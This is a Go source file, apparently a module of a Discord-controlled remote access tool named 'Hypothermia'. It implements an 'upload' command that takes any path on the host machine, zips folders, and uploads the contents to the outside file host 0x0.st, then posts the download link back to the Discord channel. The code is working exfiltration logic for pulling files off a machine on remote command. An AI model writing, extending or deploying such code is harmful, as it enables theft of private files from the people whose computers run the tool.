package commands

import (
	"fmt"
	"os"
	"strings"

	"Hypothermia/src/utils"
	"github.com/bwmarrin/discordgo"
)

const (
	uploadUsage string = "[path]"

	uploadFormatError   string = "🟥 Expected a ending quote."
	uploadArgsError     string = "🟥 Expected 1 argument."
	uploadFileInfoError string = "🟥 Failed to get info about the path."
	uploadZipError      string = "🟥 Failed to zip folder."
	uploadOpenFileError string = "🟥 Failed to open file."

	uploadSuccess string = "🟩 Uploaded at: "
)

func (*UploadCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, uploadArgsError+"\nUsage: "+uploadUsage, m.Reference())
		return
	}

	var path string
	if strings.HasPrefix(args[0], "\"") {
		joined := strings.Join(args, " ")
		start := strings.Index(joined, "\"") + 1
		end := strings.Index(joined[start:], "\"") + start

		if start == 0 || end == -1 {
			s.ChannelMessageSendReply(m.ChannelID, uploadFormatError, m.Reference())
			return
		}

		path = joined[start:end]
	} else {
		path = args[0]
	}

	info, err := os.Stat(path)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, uploadFileInfoError, m.Reference())
		return
	}

	var filePath string
	if info.IsDir() {
		filePath, err = utils.ZipFolder(path)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, uploadZipError, m.Reference())
			return
		}
	} else {
		filePath = path
	}

	file, err := os.Open(filePath)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, uploadOpenFileError, m.Reference())
		return
	}

	defer file.Close()

	url, err := utils.UploadFile(filePath, file)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(err), m.Reference())
		return
	}

	s.ChannelMessageSendReply(m.ChannelID, uploadSuccess+url, m.Reference())
}

func (*UploadCommand) Name() string {
	return "upload"
}

func (*UploadCommand) Info() string {
	return "uploads a chosen file or folder to 0x0.st"
}

type UploadCommand struct{}
